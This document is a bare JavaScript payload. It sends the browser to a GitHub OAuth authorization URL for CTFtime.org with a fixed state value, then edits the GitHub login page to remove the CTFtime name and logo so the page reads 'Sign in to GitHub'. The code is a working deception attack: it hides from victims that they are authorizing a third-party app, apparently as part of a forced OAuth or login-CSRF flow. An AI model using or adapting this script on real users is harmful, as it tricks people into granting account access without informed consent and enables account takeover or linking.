var target = "CTFtime.org" //the targeted service
if(!window.location.href.includes(target.toLowerCase())){
  window.location = "https://github.com/login?client_id=78669731cf16bc2ab97f&return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3D78669731cf16bc2ab97f%26next%3D%252F%26redirect_uri%3Dhttps%253A%252F%252Fctftime.org%252Fcomplete%252Fgithub%252F%253Fredirect_state%253D3yZxRC86O01bunBbONZncTuv3cFLaFqc%26response_type%3Dcode%26scope%3Duser%253Aemail%26state%3D3yZxRC86O01bunBbONZncTuv3cFLaFqc"
}
else if(window.location.pathname == "/login"){
  console.log("ici")
  var xpath = "//strong[contains(text(),'"+target+"')]";
  var matchingElement = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
  if (matchingElement != null){
    var parent = matchingElement.parentElement
    matchingElement.remove()
    parent.innerHTML = "Sign in to <strong>GitHub</strong>"
  }
  xpath = "//img[contains(@alt, '"+target+"')]";
  matchingElement = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
  if (matchingElement != null) {
      var parent = matchingElement.parentElement
      parent.remove()
  }
}
